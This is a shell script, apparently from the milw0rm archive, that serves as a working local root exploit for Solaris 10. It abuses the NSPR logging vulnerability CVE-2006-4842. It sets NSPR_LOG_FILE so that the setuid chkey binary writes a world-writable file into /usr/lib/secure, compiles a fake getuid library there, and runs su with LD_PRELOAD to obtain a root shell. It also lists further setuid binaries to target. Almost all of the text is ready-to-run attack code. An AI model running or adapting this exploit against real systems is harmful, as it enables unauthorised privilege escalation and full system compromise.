#!/bin/sh

#
# $Id: raptor_libnspr2,v 1.4 2006/10/16 11:50:48 raptor Exp $
#
# raptor_libnspr2 - Solaris 10 libnspr LD_PRELOAD exploit
# Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Local exploitation of a design error vulnerability in version 4.6.1 of
# NSPR, as included with Sun Microsystems Solaris 10, allows attackers to
# create or overwrite arbitrary files on the system. The problem exists 
# because environment variables are used to create log files. Even when the
# program is setuid, users can specify a log file that will be created with 
# elevated privileges (CVE-2006-4842).
#
# Newschool version of local root exploit via LD_PRELOAD (hi KF!). Another
# possible (but less l33t;) attack vector is /var/spool/cron/atjobs.
#
# See also: http://www.0xdeadbeef.info/exploits/raptor_libnspr
#
# Usage:
# $ chmod +x raptor_libnspr2
# $ ./raptor_libnspr2
# [...]
# Sun Microsystems Inc.   SunOS 5.10      Generic January 2005
# # id
# uid=0(root) gid=0(root)
# # rm /usr/lib/secure/getuid.so
# #
#
# Vulnerable platforms (SPARC):
# Solaris 10 without patch 119213-10 [tested]
#
# Vulnerable platforms (x86):
# Solaris 10 without patch 119214-10 [untested]
#

echo "raptor_libnspr2 - Solaris 10 libnspr LD_PRELOAD exploit"
echo "Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"
echo

# prepare the environment
NSPR_LOG_MODULES=all:5
NSPR_LOG_FILE=/usr/lib/secure/getuid.so
export NSPR_LOG_MODULES NSPR_LOG_FILE

# gimme -rw-rw-rw-!
umask 0

# setuid program linked to /usr/lib/mps/libnspr4.so
/usr/bin/chkey

# other good setuid targets
#/usr/bin/passwd
#/usr/bin/lp
#/usr/bin/cancel
#/usr/bin/lpset
#/usr/bin/lpstat
#/usr/lib/lp/bin/netpr
#/usr/lib/sendmail
#/usr/sbin/lpmove
#/usr/bin/login
#/usr/bin/su
#/usr/bin/mailq

# prepare the evil shared library
echo "int getuid(){return 0;}" > /tmp/getuid.c
gcc -fPIC -Wall -g -O2 -shared -o /usr/lib/secure/getuid.so /tmp/getuid.c -lc
if [ $? -ne 0 ]; then
	echo "problems compiling evil shared library, check your gcc"
	exit 1
fi

# newschool LD_PRELOAD foo;)
unset NSPR_LOG_MODULES NSPR_LOG_FILE
LD_PRELOAD=/usr/lib/secure/getuid.so su -

# milw0rm.com [2006-10-16]
